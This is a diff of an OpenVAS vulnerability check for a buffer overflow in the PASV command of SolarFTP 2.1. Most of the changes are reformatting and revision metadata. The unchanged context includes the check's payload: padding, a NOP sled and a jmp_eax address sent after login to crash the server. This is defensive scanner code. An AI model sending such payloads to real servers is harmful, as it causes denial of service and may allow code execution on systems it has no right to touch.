@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_solarftp_45748.nasl 7006 2017-08-25 11:51:20Z teissa $
+# $Id: gb_solarftp_45748.nasl 12014 2018-10-22 10:01:47Z mmartin $
 #
 # SolarFTP 'PASV' Command Remote Buffer Overflow Vulnerability
 #
@@ -26,37 +26,36 @@
 
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103024");
- script_version("$Revision: 7006 $");
- script_tag(name:"last_modification", value:"$Date: 2017-08-25 13:51:20 +0200 (Fri, 25 Aug 2017) $");
- script_tag(name:"creation_date", value:"2011-01-11 12:59:27 +0100 (Tue, 11 Jan 2011)");
- script_bugtraq_id(45748);
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_name("SolarFTP 'PASV' Command Remote Buffer Overflow Vulnerability");
- script_category(ACT_DENIAL);
- script_family("FTP");
- script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
- script_require_ports("Services/ftp", 21);
+  script_oid("1.3.6.1.4.1.25623.1.0.103024");
+  script_version("$Revision: 12014 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-22 12:01:47 +0200 (Mon, 22 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2011-01-11 12:59:27 +0100 (Tue, 11 Jan 2011)");
+  script_bugtraq_id(45748);
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("SolarFTP 'PASV' Command Remote Buffer Overflow Vulnerability");
+  script_category(ACT_DENIAL);
+  script_family("FTP");
+  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
+  script_require_ports("Services/ftp", 21);
 
- script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45748");
- script_xref(name:"URL", value:"http://www.solarftp.com/");
+  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45748");
+  script_xref(name:"URL", value:"http://www.solarftp.com/");
 
- script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code within
+  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code within
  the context of the affected application. Failed exploit attempts will
  result in a denial-of-service condition.");
- script_tag(name:"affected", value:"SolarFTP 2.1 is vulnerable; other versions may also be affected.");
- script_tag(name:"solution", value:"No solution or patch was made available for at least one year
- since disclosure of this vulnerability. Likely none will be provided anymore.
- General solution options are to upgrade to a newer release, disable respective
- features, remove the product or replace the product by another one.");
- script_tag(name:"summary", value:"SolarFTP is prone to a buffer-overflow vulnerability.");
+  script_tag(name:"affected", value:"SolarFTP 2.1 is vulnerable. Other versions may also be affected.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"SolarFTP is prone to a buffer-overflow vulnerability.");
 
- script_tag(name:"qod_type", value:"remote_vul");
- script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"WillNotFix");
 
- exit(0);
+  exit(0);
 }
 
 include("ftp_func.inc");
@@ -83,7 +82,7 @@ if(!soc1){
 domain = get_kb_item("Settings/third_party_domain");
 if(isnull(domain)) {
  domain = this_host_name();;
-}    
+}
 
 user = get_kb_item("ftp/login");
 pass = get_kb_item("ftp/password");
@@ -101,7 +100,7 @@ if(login_details)
  junk2    = crap(data:"A",length:7004);
  bad_stuff = junk + nop_sled + jmp_eax + junk2;
 
- send(socket:soc1,data:string("PASV ", bad_stuff,"\r\n"));  
+ send(socket:soc1,data:string("PASV ", bad_stuff,"\r\n"));
  ftp_close(socket:soc1);
  close(soc1);
 
@@ -116,4 +115,4 @@ if(login_details)
  exit(0);
 }
 
-exit(0); 
+exit(0);
